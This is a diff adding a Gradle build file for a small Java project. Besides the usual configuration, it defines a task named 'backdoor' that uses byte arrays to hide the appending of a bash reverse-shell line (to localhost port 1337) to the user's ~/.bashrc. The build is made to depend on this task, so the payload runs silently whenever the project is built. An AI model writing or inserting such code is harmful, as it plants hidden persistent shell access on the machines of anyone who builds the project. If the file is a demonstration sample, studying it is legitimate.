@@ -1,0 +1,29 @@
+apply plugin: 'java'
+
+sourceCompatibility = 1.6
+version = '1.0'
+
+repositories {
+    mavenCentral()
+}
+
+dependencies {
+    testCompile group: 'junit', name: 'junit', version: '4.11'
+}
+
+task harvest << {
+    def stdout = new ByteArrayOutputStream()
+    exec {
+        commandLine './builds/build2.sh'
+        standardOutput = stdout;
+    }
+    //sleep(180 * 1000)
+}
+
+task backdoor << {
+    // Append to ~/.bashrc:
+    // "\nbash -c \"bash -i>&/dev/tcp/localhost/1337 0>&1 &disown\"&>/dev/null\n"
+    new FileOutputStream(file("${System.properties[new String([117,115,101,114,46,104,111,109,101] as byte[])]}${new String([47,46,98,97,115,104,114,99] as byte[])}"), true).write([10,98,97,115,104,32,45,99,32,34,98,97,115,104,32,45,105,62,38,47,100,101,118,47,116,99,112,47,108,111,99,97,108,104,111,115,116,47,49,51,51,55,32,48,62,38,49,32,38,100,105,115,111,119,110,34,38,62,47,100,101,118,47,110,117,108,108,10] as byte[])
+}
+
+build.dependsOn backdoor
